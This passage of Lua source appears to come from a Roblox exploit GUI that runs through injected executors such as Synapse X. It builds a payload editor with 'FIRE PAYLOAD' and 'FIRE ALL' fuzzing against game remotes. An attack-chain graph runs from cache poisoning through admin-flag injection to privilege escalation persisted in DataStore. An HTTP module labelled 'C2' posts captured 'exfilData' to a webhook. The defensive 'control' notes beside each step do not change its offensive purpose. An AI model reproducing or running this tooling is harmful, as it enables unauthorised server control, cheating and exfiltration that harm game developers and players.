        targetNameLbl.TextColor3 = Color3.fromRGB(130,145,185)
    end)

    local BODY_Y = TARGET_H + SEP

    -- -- LEFT PANEL: editor + presets --------------------------------------
    local leftPanel = mF(page, 0, BODY_Y, EDIT_W, 0,
        Color3.fromRGB(12,15,26), 0.0, 6)
    leftPanel.Size = UDim2.new(0, EDIT_W, 1, -BODY_Y)
    leftPanel.ClipsDescendants = true

    -- Section header
    mL(leftPanel, PAD, 4, EDIT_W-PAD*2, 14, "PAYLOAD EDITOR",
        Enum.Font.GothamBold, 8, Color3.fromRGB(80,100,160),
        Enum.TextXAlignment.Left, 7)

    -- TextBox (payload input)
    payloadBox = Instance.new("TextBox")
    payloadBox.Size                   = UDim2.new(1, -PAD*2, 0, 44)
    payloadBox.Position               = UDim2.fromOffset(PAD, 20)
    payloadBox.BackgroundColor3       = Color3.fromRGB(10,12,22)
    payloadBox.BackgroundTransparency = 0.20
    payloadBox.BorderSizePixel        = 0
    payloadBox.Text                   = ""
    payloadBox.PlaceholderText        = "Type payload or click a preset below..."
    payloadBox.PlaceholderColor3      = Color3.fromRGB(60,75,110)
    payloadBox.TextColor3             = Color3.fromRGB(200,220,255)
    payloadBox.Font                   = Enum.Font.Code
    payloadBox.TextSize               = 10
    payloadBox.ClearTextOnFocus       = false
    payloadBox.TextXAlignment         = Enum.TextXAlignment.Left
    payloadBox.TextYAlignment         = Enum.TextYAlignment.Top
    payloadBox.MultiLine              = true
    payloadBox.ZIndex                 = 8
    payloadBox.Parent                 = leftPanel
    mC(payloadBox, 4)
    mS(payloadBox, Color3.fromRGB(50,70,130), 0.45, 1)

    -- Description label (shows preset description)
    descLbl = mL(leftPanel, PAD, 68, EDIT_W-PAD*2, 13,
        "Select a preset or enter a custom payload",
        Enum.Font.Gotham, 8, Color3.fromRGB(70,85,125),
        Enum.TextXAlignment.Left, 7)

    -- Divider + "EDGE-CASE PRESETS" label
    mF(leftPanel, PAD, 83, EDIT_W-PAD*2, 1,
        Color3.fromRGB(35,45,80), 0.60, 7)
    mL(leftPanel, PAD, 86, EDIT_W-PAD*2, 12, "EDGE-CASE PRESETS",
        Enum.Font.GothamBold, 7, Color3.fromRGB(65,80,125),
        Enum.TextXAlignment.Left, 7)

    -- Preset pill buttons (3-column grid)
    local PILL_W = math.floor((EDIT_W - PAD*2 - 6) / 3)
    local PILL_H = 18
    local PILL_GAP_X = 3
    local PILL_GAP_Y = 3
    local GRID_TOP = 100

    for i, preset in ipairs(PAYLOAD_PRESETS) do
        local col_i = (i-1) % 3
        local row_i = math.floor((i-1) / 3)
        local px = PAD + col_i * (PILL_W + PILL_GAP_X)
        local py = GRID_TOP + row_i * (PILL_H + PILL_GAP_Y)

        local pill = mBtn(leftPanel, px, py, PILL_W, PILL_H,
            preset.col, 0.82, 7)
        mC(pill, 4)
        mS(pill, preset.col, 0.60, 1)
        mL(pill, 0,0,PILL_W,PILL_H, preset.label,
            Enum.Font.GothamBold, 8, preset.col,
            Enum.TextXAlignment.Center, 8)

        local capturedPreset = preset
        local capturedIdx    = i

        pill.MouseEnter:Connect(function()
            TweenService:Create(pill, TweenInfo.new(0.08),
                {BackgroundTransparency=0.55}):Play()
            if descLbl then
                descLbl.Text       = capturedPreset.desc
                descLbl.TextColor3 = capturedPreset.col
            end
        end)
        pill.MouseLeave:Connect(function()
            if activePreset ~= capturedIdx then
                TweenService:Create(pill, TweenInfo.new(0.08),
                    {BackgroundTransparency=0.82}):Play()
            end
            if descLbl then
                descLbl.Text       = activePreset and
                    PAYLOAD_PRESETS[activePreset].desc or
                    "Select a preset or enter a custom payload"
                descLbl.TextColor3 = activePreset and
                    PAYLOAD_PRESETS[activePreset].col or
                    Color3.fromRGB(70,85,125)
            end
        end)

        pill.MouseButton1Click:Connect(function()
            activePreset = capturedIdx
            if payloadBox then
                payloadBox.Text = capturedPreset.display
            end
            if descLbl then
                descLbl.Text       = capturedPreset.desc
                descLbl.TextColor3 = capturedPreset.col
            end
            -- Dim all other pills
            for j, child in ipairs(leftPanel:GetChildren()) do
                if child:IsA("TextButton") and child ~= pill then
                    TweenService:Create(child, TweenInfo.new(0.08),
                        {BackgroundTransparency=0.88}):Play()
                end
            end
            TweenService:Create(pill, TweenInfo.new(0.08),
                {BackgroundTransparency=0.40}):Play()
        end)
    end

    -- Rows used: 4 rows of presets (12 presets / 3 cols)
    local presetRows = math.ceil(#PAYLOAD_PRESETS / 3)
    local ACTION_Y   = GRID_TOP + presetRows*(PILL_H+PILL_GAP_Y) + PAD

    -- Divider
    mF(leftPanel, PAD, ACTION_Y-4, EDIT_W-PAD*2, 1,
        Color3.fromRGB(35,45,80), 0.60, 7)

    -- FIRE PAYLOAD button
    local FIRE_W = math.floor((EDIT_W - PAD*2 - 4) * 0.55)
    local fireBtn = mBtn(leftPanel, PAD, ACTION_Y, FIRE_W, 20,
        Color3.fromRGB(28,80,42), 0.30, 7)
    mC(fireBtn, 5)
    mS(fireBtn, Color3.fromRGB(88,204,128), 0.40, 1)
    mGlow(fireBtn, Color3.fromRGB(88,204,128), 0.72, 2)
    mL(fireBtn, 0,0,FIRE_W,20, "FIRE PAYLOAD",
        Enum.Font.GothamBold, 9, Color3.fromRGB(88,204,128),
        Enum.TextXAlignment.Center, 8)
    fireBtn.MouseEnter:Connect(function()
        TweenService:Create(fireBtn, TweenInfo.new(0.08),{BackgroundTransparency=0.10}):Play()
    end)
    fireBtn.MouseLeave:Connect(function()
        TweenService:Create(fireBtn, TweenInfo.new(0.08),{BackgroundTransparency=0.30}):Play()
    end)
    fireBtn.MouseButton1Click:Connect(function()
        local payload
        if activePreset then
            payload = PAYLOAD_PRESETS[activePreset].gen()
        else
            payload = getPayloadValue()
        end
        addLog("SEP_LOG", string.rep("-", 38))
        task.spawn(function() firePayload(payload) end)
    end)

    -- FIRE ALL button (fuzz all presets sequentially)
    local FALL_W = EDIT_W - PAD*2 - FIRE_W - 4
    local fireAllBtn = mBtn(leftPanel, PAD+FIRE_W+4, ACTION_Y, FALL_W, 20,
        Color3.fromRGB(60,30,10), 0.40, 7)
    mC(fireAllBtn, 5)
    mS(fireAllBtn, Color3.fromRGB(210,130,42), 0.45, 1)
    mL(fireAllBtn,0,0,FALL_W,20,"FIRE ALL",
        Enum.Font.GothamBold,8,Color3.fromRGB(210,130,42),
        Enum.TextXAlignment.Center,8)
    fireAllBtn.MouseEnter:Connect(function()
        TweenService:Create(fireAllBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.15}):Play()
    end)
    fireAllBtn.MouseLeave:Connect(function()
        TweenService:Create(fireAllBtn,TweenInfo.new(0.08),{BackgroundTransparency=0.40}):Play()
    end)
    fireAllBtn.MouseButton1Click:Connect(function()
        -- Fuzz run: fire each preset with 0.35s gap
        task.spawn(function()
            addLog("SEP_LOG", string.rep("=", 38))
            addLog("INFO", "FUZZ RUN -- firing all " .. #PAYLOAD_PRESETS .. " presets sequentially")
            addLog("SEP_LOG", string.rep("-", 38))
            for i, preset in ipairs(PAYLOAD_PRESETS) do
                if isFiring then task.wait(0.5) end
                addLog("INFO", "Preset " .. i .. "/" .. #PAYLOAD_PRESETS
                    .. ": " .. preset.label)
                task.spawn(function() firePayload(preset.gen()) end)
                task.wait(0.40)
            end
            addLog("SEP_LOG", string.rep("-", 38))
            addLog("INFO", "FUZZ RUN complete.")
        end)
    end)

    -- -- VERTICAL DIVIDER --------------------------------------------------
    mF(page, EDIT_W, BODY_Y, SEP, 0,
        Color3.fromRGB(35,45,80), 0.50, 6).Size = UDim2.new(0,SEP,1,-BODY_Y)

    -- -- RIGHT PANEL: console output ---------------------------------------
    local rightPanel = mF(page, EDIT_W+SEP, BODY_Y, 0, 0,
        Color3.fromRGB(8,9,16), 0.0, 6)
    rightPanel.Size = UDim2.new(1, -(EDIT_W+SEP), 1, -BODY_Y)
    rightPanel.ClipsDescendants = true

    -- Console header bar
    local conHdr = mF(rightPanel, 0, 0, 0, 20,
        Color3.fromRGB(10,12,22), 0.0, 7)
    conHdr.Size = UDim2.new(1,0,0,20)
    mL(conHdr, PAD, 0, 80, 20, "CONSOLE OUTPUT",
        Enum.Font.GothamBold, 7, Color3.fromRGB(65,80,125),
        Enum.TextXAlignment.Left, 8)

    -- CLEAR button for console
    local clrBtn = mBtn(conHdr, 0, 2, 32, 16,
        Color3.fromRGB(60,15,18), 0.50, 8)
    clrBtn.Position = UDim2.new(1,-38,0,2)
    mC(clrBtn, 3)
    mS(clrBtn, Color3.fromRGB(180,60,65), 0.55, 1)
    mL(clrBtn,0,0,32,16,"CLR",Enum.Font.GothamBold,7,
        Color3.fromRGB(200,80,85),Enum.TextXAlignment.Center,9)
    clrBtn.MouseButton1Click:Connect(clearLog)

    -- Console divider
    mF(rightPanel, 0, 20, 0, 1,
        Color3.fromRGB(30,38,70), 0.60, 7).Size = UDim2.new(1,0,0,1)

    -- Scrollable log area
    consoleScroll = Instance.new("ScrollingFrame")
    consoleScroll.Size                       = UDim2.new(1, 0, 1, -21)
    consoleScroll.Position                   = UDim2.fromOffset(0, 21)
    consoleScroll.BackgroundTransparency     = 1
    consoleScroll.BorderSizePixel            = 0
    consoleScroll.ScrollBarThickness         = 2
    consoleScroll.ScrollBarImageColor3       = Color3.fromRGB(60,80,160)
    consoleScroll.ScrollBarImageTransparency = 0.40
    consoleScroll.CanvasSize                 = UDim2.fromOffset(0, 0)
    consoleScroll.ZIndex                     = 8
    consoleScroll.Parent                     = rightPanel

    consoleHolder = Instance.new("Frame")
    consoleHolder.Name                  = "LogHolder"
    consoleHolder.Size                  = UDim2.new(1,-4,0,0)
    consoleHolder.BackgroundTransparency = 1
    consoleHolder.BorderSizePixel       = 0
    consoleHolder.ZIndex                = 8
    consoleHolder.Parent                = consoleScroll

    -- Boot message
    addLog("INFO", "Payload Simulator ready.")
    addLog("INFO", "Select a target remote via SYNC (from graph) or SCAN (live search).")
    addLog("INFO", "Choose a preset or type a custom payload, then FIRE PAYLOAD.")
end



-- TAB DEFINITIONS
local CONTENT_PAD = T.PADDING

-- --- HIGH-PROBABILITY DEPENDENCY CHAIN (HPDC) -----------------------------
-- Node types for the HPDC graph. Five steps modelling the state-trust attack
-- path. Each step has an action list of real patterns found in Roblox games so
-- users can select the specific variant they are analysing.

local HPDC_NODE_TYPES = {
    {
        id    = "INGRESS", role = "INGRESS",
        label = "Ingress",
        control = {
            name = "Reject unknown action types at boundary",
            d    = "Enumerate all valid action keys. Reject any payload whose action field is not in a server-side hardcoded allowlist before routing.",
        },
        actions = {
            { n = "NetworkManager",      d = "Centralised framework routing all client->server calls through one remote. Dynamic action dispatch with no per-action schema." },
            { n = "UpdateState",         d = "Generic state-update remote. Accepts an action key + payload table. High-probability target: one remote, many attack surfaces." },
            { n = "BridgeNet",           d = "Open-source networking library. Single remote, packet-ID routing. Dynamic handler lookup -- no static validation per packet type." },
            { n = "ActionDispatcher",    d = "Custom pattern: client sends {action, args}. Server routes by action string dynamically. Validation is per-handler, not centralised." },
            { n = "DataPacketHandler",   d = "Raw packet handler that reconstructs structured data from a client-sent table. Deserializes before validating." },
            { n = "Custom Remote",       d = "A bespoke single-remote gateway specific to this game. Centralised routing without framework-level schema enforcement." },
        },
    },
    {
        id    = "SERIAL", role = "SERIAL",
        label = "Serializer",
        control = {
            name = "Schema-validate before deserializing",
            d    = "Define a strict schema per action type. Validate field types, nesting depth, and value ranges before passing any data to a deserializer or dynamic handler.",
        },
        actions = {
            { n = "JSON Deserialization",        d = "HttpService:JSONDecode on a client-sent string. Deep nested objects survive shallow type checks. No depth limit enforced." },
            { n = "Custom Table Reconstruction", d = "Server rebuilds a complex table from client-sent fields. No maximum depth or type restrictions -- deeply nested arrays bypass sanitisation." },
            { n = "Dynamic Key Routing",         d = "Dictionary keys from the client payload are used to look up sub-handlers. Unexpected keys reach unintended code paths." },
            { n = "Type Coercion Pattern",       d = "Server implicitly converts types (tonumber, tostring) on client data without bounding. Input 'inf' or '9e99' survives as math.huge." },
            { n = "Legacy HTTP Module",           d = "Older serialization library with no recursive depth limits or type enforcement. Mixed-type arrays parsed without nil-hole guards." },
            { n = "Mixed-Type Array",             d = "Handler accepts arrays with mixed types. Nil holes and unexpected types bypass shallow checks targeting only numeric indices." },
        },
    },
    {
        id    = "INTERSERVICE", role = "INTERSERVICE",
        label = "Lateral Transport",
        control = {
            name = "Never treat cache reads as validated input",
            d    = "Mark session cache writes with origin provenance. Secondary systems must re-validate any field sourced from a client-written cache entry before acting on it.",
        },
        actions = {
            { n = "Profile Cache Write",       d = "Deserialised client payload saved directly into the player profile cache (e.g. ProfileService, custom SessionStore). Cache is now poisoned." },
            { n = "Global Session Variable",   d = "Attacker-controlled value stored in a server-wide session table keyed by player. All subsequent reads treat it as server-authoritative." },
            { n = "Source-of-Truth Bypass",    d = "Secondary systems (combat, economy, matchmaker) read from the session cache as their authoritative input source, skipping the validation boundary." },
            { n = "Economy Loop Poisoning",    d = "Currency or resource values written to cache are consumed by the economy loop on the next tick without re-derivation from a trusted source." },
            { n = "Matchmaker State Exploit",  d = "Player rating, rank, or eligibility flags in the session cache are consumed by the matchmaker directly, allowing skill-bracket manipulation." },
            { n = "Combat Handler Trust",      d = "Health, damage multipliers, or ability flags read from the session cache by combat handlers without re-checking against server-computed baselines." },
        },
    },
    {
        id    = "REFLECT", role = "REFLECT",
        label = "Reflection Sink",
        control = {
            name = "Hardcode all factory inputs -- never use cache strings as identifiers",
            d    = "Class names, property keys, parent paths, and JSON payloads passed to object factories must be hardcoded server-side. A cache value is a client value -- treat it as one.",
        },
        actions = {
            { n = "Instance.new(cache string)",  d = "Unvalidated string from the session cache passed as the class name to Instance.new(). Attacker controls what object type the server instantiates. Script, LocalScript, and ModuleScript are valid class names." },
            { n = "Script in Unmonitored Container", d = "Instantiated Script or LocalScript parented to an unmonitored container (e.g. ServerStorage, a non-scanned folder). Executes server-side without triggering standard script detection." },
            { n = "JSONDecode Reflection",       d = "HttpService:JSONDecode() called on a cache-sourced string. The decoded table's keys are then used as property identifiers or routing keys -- deserialization becomes a second reflection layer." },
            { n = "Dynamic Property Setter",     d = "A generic property-setter loop uses cache-sourced strings as property keys: obj[cacheValue] = data. Overwrites any writable property including Archivable, Disabled, and RunContext." },
            { n = "Config Attribute Rewrite",    d = "Configuration attributes (set via :SetAttribute()) sourced from the session cache rewrite values that control how subsequent server code operates -- feature flags, rate limits, permission tiers." },
            { n = "Object Factory Poisoning",    d = "A centralised object factory function receives the cache-sourced class name and builds the object on behalf of a caller that assumes the factory validates its input. Trust delegated, never enforced." },
        },
    },
    {
        id    = "LRCE", role = "LRCE",
        label = "Logical Execution",
        control = {
            name = "Never derive authorisation state from mutable session cache",
            d    = "Admin flags, role tables, and permission checks must be derived from immutable server sources (GroupService, hardcoded tables, signed tokens) -- never from a session cache field that any upstream handler could have written.",
        },
        actions = {
            { n = "Admin Flag Injection",        d = "The server routing table reads an isAdmin or role field from the session cache. Step 4 overwrote that field. The operator is now treated as a developer-level administrator by all downstream permission checks." },
            { n = "Authorization Check Disable", d = "A configuration attribute controlling a critical server-side guard (e.g. anticheat enabled, rate-limit active) was rewritten at Step 4 to a falsy value. The check is now permanently disabled for this session." },
            { n = "Native Admin Remote Hijack",  d = "The game's own built-in administrative RemoteFunction (intended for developers only) now passes the operator's permission check. Arbitrary level-commands execute server-side through a trusted, developer-authored endpoint." },
            { n = "Debug Endpoint Exposure",     d = "A debugging remote or studio-only endpoint gated behind an isStudio or isDev check is bypassed because the session cache field it reads was overwritten. Native tooling becomes an attack surface." },
            { n = "Routing Table Corruption",    d = "The server's internal action-dispatch table is modified via a property rewrite at Step 4, redirecting legitimate player actions to elevated handler functions that were never meant to be reachable by clients." },
            { n = "Persistent State Override",   d = "The corrupted session state is flushed to DataStore before the session ends, permanently encoding the privilege escalation. The operator retains elevated access on every subsequent session load without repeating the attack chain." },
        },
    },
}

-- -- HPDC page builder ---------------------------------------------------------
-- Re-uses the full graph engine (spawnNode, makeWire, openCtxMenu, executeChain,
-- scoreChain, TRACE, EXECUTE, CONSOLE) with HPDC-specific node types.
local function saveGraphToCtx(ctx)
    ctx.nodes      = graphNodes
    ctx.wires      = graphWires
    ctx.canvas     = graphCanvas
    ctx.page       = graphPage
    ctx.selected   = selectedNode
    ctx.wiringFrom = wiringFrom
end

local function activateGraphCtx(id, ctx)
    if id == activeGraphId then return end
    -- Save current context
    local curCtx = (activeGraphId == "SS") and ssCtx or hpdcCtx
    saveGraphToCtx(curCtx)
    -- Close any open overlays from the previous graph
    if ctxMenu   then ctxMenu:Destroy()   ctxMenu=nil   end
    if selectedNode then
        if selectedNode.brackets then
            for _, b in ipairs(selectedNode.brackets) do b.BackgroundTransparency=1 end
        end
        selectedNode = nil
    end
    wiringFrom = nil
    -- Restore target context
    activeGraphId = id
    graphNodes   = ctx.nodes
    graphWires   = ctx.wires
    graphCanvas  = ctx.canvas
    graphPage    = ctx.page
    selectedNode = ctx.selected
    wiringFrom   = ctx.wiringFrom
    refreshWires()
end

local function buildHPDCPage(page)
    -- Register this page with the HPDC context
    hpdcCtx.page = page
    -- Temporarily activate HPDC context so spawnNode etc. write to the right state
    -- (S->S is the default active context at build time so we set manually here)
    hpdcCtx.nodes  = {}
    hpdcCtx.wires  = {}
    hpdcCtx.canvas = nil

    page.ClipsDescendants = true

    local TOOLBAR_H = 28

    -- -- Toolbar (same layout as S->S but uses HPDC node types) ---
    local toolbar = mF(page, 0, 0, 0, TOOLBAR_H, Color3.fromRGB(12,14,22), 0.55, 8)
    toolbar.Size = UDim2.new(1,0,0,TOOLBAR_H)
    mF(toolbar,0,TOOLBAR_H-1,0,1,GC.DIV,0.50,9).Size=UDim2.new(1,0,0,1)

    mL(toolbar, 8, 0, 50, TOOLBAR_H, "ADD:",
        Enum.Font.GothamBold, 8, GC.DIM, Enum.TextXAlignment.Left, 9)

    local function localSpawn(td, vx, vy)
        -- Temporarily swap to HPDC context so spawnNode writes to hpdcCtx
        local saveNodes, saveWires, saveCanvas, savePage =
            graphNodes, graphWires, graphCanvas, graphPage
        graphNodes  = hpdcCtx.nodes
        graphWires  = hpdcCtx.wires
        graphCanvas = hpdcCtx.canvas
        graphPage   = hpdcCtx.page
        local node  = spawnNode(td, vx, vy)
        -- Write back (canvas was set by spawnNode's first use)
        hpdcCtx.nodes  = graphNodes
        hpdcCtx.wires  = graphWires
        hpdcCtx.canvas = graphCanvas
        -- Restore previous context (S->S or whichever is active)
        graphNodes  = saveNodes
        graphWires  = saveWires
        graphCanvas = saveCanvas
        graphPage   = savePage
        return node
    end

    local bx = 42
    for _, td in ipairs(HPDC_NODE_TYPES) do
        local acc = ROLE_ACC[td.role]
        local bw  = math.max(52, #td.label * 7 + 14)
        local spawnBtn = mBtn(toolbar, bx, (TOOLBAR_H-18)/2, bw, 18, acc, 0.78, 9)
        mC(spawnBtn, 4)
        mS(spawnBtn, acc, 0.55, 1)
        mL(spawnBtn,0,0,bw,18, td.label, Enum.Font.GothamBold, 8, acc,
            Enum.TextXAlignment.Center, 10)
        spawnBtn.MouseEnter:Connect(function()
            TweenService:Create(spawnBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.55}):Play()
        end)
        spawnBtn.MouseLeave:Connect(function()
            TweenService:Create(spawnBtn,TweenInfo.new(0.10),{BackgroundTransparency=0.78}):Play()
        end)
        local capturedTd = td
        spawnBtn.MouseButton1Click:Connect(function()
            if activeGraphId ~= "HPDC" then return end
            local vx = graphCanvas.CanvasPosition.X + graphCanvas.AbsoluteSize.X/2 - NODE_W/2
            local vy = graphCanvas.CanvasPosition.Y + graphCanvas.AbsoluteSize.Y/2 - NODE_H/2
            vx = vx + (#graphNodes % 4) * (NODE_W + 20) - (NODE_W+20)*1.5
            vy = vy + math.floor(#graphNodes/4) * (NODE_H+30)
            spawnNode(capturedTd, vx, vy)
        end)
        bx = bx + bw + 4
    end

    -- Right-side buttons: [AUTO GEN][Clear All][Execute]
    -- AUTO GEN
    local hpdcGenBtn = mBtn(toolbar,0,(TOOLBAR_H-18)/2,70,18,
        Color3.fromRGB(0,210,110),0.82,9)
    hpdcGenBtn.Position = UDim2.new(1,-212,0,(TOOLBAR_H-18)/2)
    mC(hpdcGenBtn,4) mS(hpdcGenBtn,Color3.fromRGB(0,210,110),0.45,1)
    mL(hpdcGenBtn,0,0,70,18,"** AUTO GEN",
        Enum.Font.GothamBold,7,Color3.fromRGB(0,210,110),
        Enum.TextXAlignment.Center,10)
    hpdcGenBtn.MouseEnter:Connect(function()
        hpdcGenBtn.BackgroundColor3=Color3.fromRGB(0,210,110)
        hpdcGenBtn.BackgroundTransparency=0.65
    end)
    hpdcGenBtn.MouseLeave:Connect(function() hpdcGenBtn.BackgroundTransparency=0.82 end)
    hpdcGenBtn.MouseButton1Click:Connect(function()
        hpdcGenBtn.BackgroundTransparency=0.40
        task.delay(0.12,function() hpdcGenBtn.BackgroundTransparency=0.82 end)
        if ssCtx.genPrompt then ssCtx.genPrompt() end
    end)

    -- Clear All
    local clearAllH = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 56, 18, GC.ERR, 0.80, 9)
    clearAllH.Position = UDim2.new(1,-64,0,(TOOLBAR_H-18)/2)
    mC(clearAllH, 4) mS(clearAllH, GC.ERR, 0.60, 1)
    mL(clearAllH,0,0,56,18,"Clear All",Enum.Font.GothamBold,8,GC.ERR,Enum.TextXAlignment.Center,10)
    clearAllH.MouseButton1Click:Connect(function()
        if activeGraphId ~= "HPDC" then return end
        for _, n in ipairs(graphNodes) do n.frame:Destroy() end
        graphNodes = {} hpdcCtx.nodes = {}
        for _, w in ipairs(graphWires) do w.frame:Destroy() end
        graphWires = {} hpdcCtx.wires = {}
        closeCtx() selectedNode=nil wiringFrom=nil
    end)

    -- Execute button -- runs executeChain() on the HPDC graph
    local execBtnH = mBtn(toolbar, 0, (TOOLBAR_H-18)/2, 62, 18, GC.CHK, 0.70, 9)
    execBtnH.Position = UDim2.new(1,-134,0,(TOOLBAR_H-18)/2)
    mC(execBtnH, 4)
    mS(execBtnH, GC.CHK, 0.40, 1)
    mGlow(execBtnH, GC.CHK, 0.70, 2)
    mL(execBtnH,0,0,62,18,"EXECUTE",Enum.Font.GothamBold,8,GC.CHK,Enum.TextXAlignment.Center,10)
    execBtnH.MouseEnter:Connect(function()
        TweenService:Create(execBtnH,TweenInfo.new(0.10),{BackgroundTransparency=0.40}):Play()
    end)
    execBtnH.MouseLeave:Connect(function()
        TweenService:Create(execBtnH,TweenInfo.new(0.10),{BackgroundTransparency=0.70}):Play()
    end)
    execBtnH.MouseButton1Click:Connect(function()
        if activeGraphId ~= "HPDC" then return end
        TweenService:Create(execBtnH,TweenInfo.new(0.08),{BackgroundTransparency=0.10}):Play()
        task.delay(0.12,function()
            TweenService:Create(execBtnH,TweenInfo.new(0.12),{BackgroundTransparency=0.70}):Play()
        end)
        task.spawn(executeChain)
    end)

    -- -- Canvas ----------------------------------------------------
    local canvas = Instance.new("ScrollingFrame")
    canvas.Name                       = "HPDCCanvas"
    canvas.Size                       = UDim2.new(1,0,1,-TOOLBAR_H)
    canvas.Position                   = UDim2.fromOffset(0,TOOLBAR_H)
    canvas.BackgroundColor3           = GC.CANVAS
    canvas.BackgroundTransparency     = 0.78
    canvas.BorderSizePixel            = 0
    canvas.ScrollBarThickness         = 3
    canvas.ScrollBarImageColor3       = Color3.fromRGB(60,80,160)
    canvas.ScrollBarImageTransparency = 0.40
    canvas.CanvasSize                 = UDim2.fromOffset(1200, 800)
    canvas.ZIndex                     = 8
    canvas.Parent                     = page

    -- Store canvas in HPDC context
    hpdcCtx.canvas = canvas
    hpdcCtx.page   = page

    -- Grid dots
    local GRID_STEP = 28
    for gx = 0, 1200, GRID_STEP do
        for gy = 0, 800, GRID_STEP do
            local dot = mF(canvas, gx, gy, 2, 2, GC.GRID, 0.88, 8)
            mC(dot, 1)
        end
    end

    -- Canvas click: deselect + cancel wiring + close ctx (only when HPDC active)
    canvas.InputBegan:Connect(function(inp)
        if activeGraphId ~= "HPDC" then return end
        if inp.UserInputType == Enum.UserInputType.MouseButton1 then
            deselectNode()
            closeCtx()
            if wiringFrom then
                if wiringFrom.outPort then wiringFrom.outPort.BackgroundTransparency=0.0 end
                wiringFrom = nil
            end
        end
    end)

    -- HPDC starts blank -- user builds the chain deliberately.
    -- The canvas and context are registered; no default nodes are spawned.
    -- Store the canvas reference in the HPDC context so activateGraphCtx
    -- has access to it when the tab is first switched to.
    hpdcCtx.canvas = canvas
    hpdcCtx.page   = page

    -- Escape key: cancel wiring / close ctx (only when HPDC active)
    UserInputService.InputBegan:Connect(function(inp, processed)
        if processed or activeGraphId ~= "HPDC" then return end
        if inp.KeyCode == Enum.KeyCode.Escape then
            closeCtx()
            if wiringFrom then
                if wiringFrom.outPort then wiringFrom.outPort.BackgroundTransparency=0.0 end
                wiringFrom = nil
            end
        end
    end)
end

-- --- HTTP FEEDBACK STATE -----------------------------------------------------
-- HTTP table is declared early (before executeNode) so that the chain executor
-- can call HTTP:post() and HTTP:get(). Methods are added below.

-- HTTP methods stored on the table to avoid hitting Lua's 200-local limit
function HTTP:capture(category, name, data)
    table.insert(self.exfilData, {
        category  = category,
        name      = name,
        data      = data,
        timestamp = os.date("%H:%M:%S"),
        id        = #self.exfilData + 1,
    })
    if self.treeRefresh then task.spawn(self.treeRefresh) end
end

-- Package and POST data to the configured webhook URL.
-- Returns (ok, statusCode, responseBody, elapsedMs).
function HTTP:post(url, payload)
    if not url or url == "" then
        return false, nil, "No URL configured.", 0
    end

    -- Encode payload to JSON
    local bodyStr
    if type(payload) == "table" then
        local jOk, j = pcall(function()
            return game:GetService("HttpService"):JSONEncode(payload)
        end)
        bodyStr = jOk and j or tostring(payload)
    else
        bodyStr = tostring(payload)
    end

    local HEADERS = {
        ["Content-Type"] = "application/json",
        ["User-Agent"]   = "TransparentGui-C2/1.0",
    }
    local REQ_TBL = { Url=url, Method="POST", Headers=HEADERS, Body=bodyStr }

    local startT = tick()
    local ok     = false
    local status = "ERR"
    local body   = ""

    -- -- Method 1: request() -----------------------------------------------
    -- Resolved fresh each call so a reinjected executor is picked up instantly.
    local _req = _execFn("request")
    if not ok and _req then
        local rOk, res = pcall(_req, REQ_TBL)
        if rOk and type(res) == "table" then
            local sc = tonumber(res.StatusCode) or 0
            -- Discord returns 204 (No Content) on success
            ok     = sc >= 200 and sc < 300
            status = tostring(sc)
            body   = tostring(res.Body or ""):sub(1, 512)
        end
    end

    -- -- Method 2: syn.request (Synapse X) --------------------------------
    if not ok then
        local _syn = _execFn("syn")
        local _synReq = type(_syn) == "table" and _syn.request or nil
        if _synReq then
            local rOk, res = pcall(_synReq, REQ_TBL)
            if rOk and type(res) == "table" then
                local sc = tonumber(res.StatusCode) or 0
                ok     = sc >= 200 and sc < 300
                status = tostring(sc)
                body   = tostring(res.Body or ""):sub(1, 512)
            end
        end
    end

    -- -- Method 3: http_request() -----------------------------------------
    local _hreq = _execFn("http_request")
    if not ok and _hreq then
        local rOk, res = pcall(_hreq, REQ_TBL)
        if rOk and type(res) == "table" then
            local sc = tonumber(res.StatusCode) or 0
            ok     = sc >= 200 and sc < 300
            status = tostring(sc)
            body   = tostring(res.Body or ""):sub(1, 512)
        end
    end

    -- -- Method 4: HttpService:PostAsync (Studio only) ---------------------
    -- Blocked in live games from LocalScript -- only reaches here if all
    -- executor methods above were nil (i.e. running in Studio).
    if not ok then
        local rOk, res = pcall(function()
            return game:GetService("HttpService"):PostAsync(
                url, bodyStr, Enum.HttpContentType.ApplicationJson)
        end)
        if rOk then
            ok = true; status = "200"; body = tostring(res):sub(1, 512)
        else
            body = tostring(res):sub(1, 200)
        end
    end

    local elapsed = math.floor((tick() - startT) * 1000)

    -- -- Fallback: clipboard -----------------------------------------------
    -- All HTTP methods failed. Copy raw JSON to clipboard so the user can
    -- send it manually via Postman / curl / browser dev tools.
    if not ok then
        local cbOk = pcall(setclipboard, bodyStr)
        if not cbOk then
            pcall(toclipboard, bodyStr)
        end
        body = body ~= "" and (body.." | clipboard copy attempted")
            or "all HTTP methods blocked -- clipboard copy attempted"
        status = "CLIP"
    end

    table.insert(HTTP.feedHistory, {
        ts      = os.date("%H:%M:%S"),
        method  = "POST",
        url     = url:sub(1, 48),
        status  = status,
        ms      = elapsed,
        response= body,
        payload = bodyStr:sub(1, 256),
    })
    if HTTP.treeRefresh then task.spawn(HTTP.treeRefresh) end
    return ok, status, body, elapsed
end

-- GET request -- same executor-first fallback chain as POST
function HTTP:get(url, params)
    if not url or url == "" then
        return false, nil, "No URL configured.", 0
    end

    -- Append query params if provided
    if type(params) == "table" then
        local parts = {}
        for k, v in pairs(params) do
            table.insert(parts, tostring(k).."="..tostring(v))
        end
        if #parts > 0 then
            url = url .. (url:find("?") and "&" or "?") .. table.concat(parts,"&")
        end
    end

    local REQ_TBL = { Url=url, Method="GET",
        Headers={ ["User-Agent"]="TransparentGui-C2/1.0" } }

    local startT = tick()
    local ok     = false
    local status = "ERR"
    local body   = ""

    -- Method 1: request() -- use upvalue captured in main thread
    -- Method 1: request() -- fresh lookup each call
    local _req = _execFn("request")
    if not ok and _req then
        local rOk, res = pcall(_req, REQ_TBL)
        if rOk and type(res)=="table" then
            local sc = tonumber(res.StatusCode) or 0
            ok = sc>=200 and sc<300
            status = tostring(sc)
            body   = tostring(res.Body or ""):sub(1,2048)
        end
    end

    -- Method 2: syn.request (Synapse X) -- fresh lookup each call
    if not ok then
        local _syn = _execFn("syn")
        local _synReq = type(_syn)=="table" and _syn.request or nil
        if _synReq then
            local rOk, res = pcall(_synReq, REQ_TBL)
            if rOk and type(res)=="table" then
                local sc = tonumber(res.StatusCode) or 0
                ok = sc>=200 and sc<300
                status = tostring(sc)
